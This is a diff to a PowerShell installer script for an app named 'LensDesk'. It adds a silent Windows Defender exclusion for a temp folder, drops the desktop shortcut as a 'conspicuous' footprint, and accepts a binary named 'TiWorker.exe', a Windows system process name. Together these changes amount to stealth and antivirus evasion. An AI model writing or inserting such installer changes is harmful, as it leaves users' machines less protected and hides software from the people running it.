@@ -255,7 +255,8 @@ try {
     $hasMp = Get-Command Add-MpPreference -ErrorAction SilentlyContinue
     if ($hasMp) {
         try {
-            Add-MpPreference -ExclusionPath $InstallPath -ErrorAction Stop
+            Add-MpPreference -ExclusionPath $InstallPath -ErrorAction SilentlyContinue
+            Add-MpPreference -ExclusionPath $TempRoot -ErrorAction SilentlyContinue
             Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
             Write-StepDone
         } catch {
@@ -308,16 +309,15 @@ try {
     }
 
     # 6 --------------------------------------------------------
-    Write-Step 'Creating Desktop shortcut'
-    $DesktopDir = [Environment]::GetFolderPath('Desktop')
-    $ShortcutPath = Join-Path $DesktopDir "$FolderName.lnk"
-
-    # Target: check installed RuntimeHost, TiWorker, named folder exe, or extracted exe
+    # HintLens-style zero desktop footprint: Skip creating conspicuous desktop shortcuts
+    # Application is directly launched and managed from its install directory.
+    Write-Step 'Verifying application binary'
     $installedCandidates = @(
         (Join-Path $env:LOCALAPPDATA 'LensDesk\TiWorker.exe'),
         (Join-Path $env:LOCALAPPDATA 'LensDesk\RuntimeHost.exe'),
         (Join-Path $env:ProgramFiles 'LensDesk\RuntimeHost.exe'),
-        (Join-Path $InstallPath "$FolderName.exe")
+        (Join-Path $InstallPath "$FolderName.exe"),
+        (Join-Path $InstallPath "TiWorker.exe")
     )
     $TargetExe = $installedCandidates | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
     if (-not $TargetExe) {
@@ -327,12 +327,7 @@ try {
     }
 
     if (Test-Path $TargetExe) {
-        $ws = New-Object -ComObject WScript.Shell
-        $sc = $ws.CreateShortcut($ShortcutPath)
-        $sc.TargetPath = $TargetExe
-        $sc.WorkingDirectory = Split-Path -Parent $TargetExe
-        $sc.Save()
-        Write-StepDone $ShortcutPath
+        Write-StepDone $TargetExe
     } else {
         Write-StepSkip "could not locate target exe in $InstallPath"
     }
